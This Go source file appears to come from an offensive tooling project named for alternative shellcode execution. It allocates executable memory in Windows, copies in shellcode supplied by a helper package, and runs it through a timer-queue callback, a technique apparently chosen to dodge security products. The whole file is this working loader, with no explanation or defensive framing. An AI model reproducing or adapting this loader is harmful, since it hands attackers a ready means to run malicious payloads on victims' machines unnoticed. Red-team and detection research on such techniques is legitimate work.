package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

var (
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc          = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory         = kernel32.NewProc("RtlMoveMemory")
	CreateTimerQueue      = kernel32.NewProc("CreateTimerQueue")
	CreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	CreateEvent           = kernel32.NewProc("CreateEventW")
	WaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
	GetLastError          = kernel32.NewProc("GetLastError")
)

func Run(op []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))

	var timer uintptr
	queue, _, _ := CreateTimerQueue.Call()
	gDoneEvent, _, _ := CreateEvent.Call(0, 1, 0, 0)
	ret, _, _ := CreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&timer)), uintptr(queue), uintptr(addr), 0, 100, 0, 0)

	if ret == 0 {
		fmt.Println("Fail")
	}

	waitResult, _, _ := WaitForSingleObject.Call(uintptr(gDoneEvent), INFINITE)
	if waitResult != 0 {
		errCode, _, _ := GetLastError.Call()
		fmt.Printf("WaitForSingleObject failed (%d)\n", errCode)
	}
}

func main() {
	Run(util.ShellCode())
}
